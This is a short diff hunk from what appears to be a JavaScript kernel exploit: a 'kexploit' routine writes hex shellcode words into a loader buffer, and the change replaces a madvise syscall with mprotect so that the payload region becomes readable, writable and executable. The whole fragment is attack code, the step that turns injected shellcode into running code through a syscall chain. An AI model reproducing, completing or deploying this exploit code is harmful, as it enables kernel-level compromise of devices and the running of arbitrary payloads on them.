@@ -1788,7 +1788,7 @@ kexploit().then(() => {
     BLDR[57] = 0x48C3050F; BLDR[58] = 0x006AC0C7; BLDR[59] = 0x89490000;
     BLDR[60] = 0xC3050FCA;
 
-    chain.sys('madvise', payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
+    chain.sys('mprotect', payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
 
     var pthread = malloc(0x10);
 
